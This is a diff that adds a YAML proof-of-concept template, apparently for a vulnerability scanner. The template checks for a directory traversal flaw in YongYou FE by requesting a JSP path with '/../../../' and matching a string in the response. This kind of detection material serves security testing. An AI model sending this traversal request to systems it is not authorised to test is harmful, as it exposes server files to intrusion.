@@ -1,0 +1,16 @@
+id: poc-yaml-yongyou-fe-directory-traversal
+info:
+  name: YongYou FE 目录遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: YongYou
+  osprey-id: vb_2022_0101
+requests:
+- method: GET
+  path: /system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
+  expression: 'contains(body, "function deletefile(name,path)")
+
+    '
+variables: {}
+transport: http
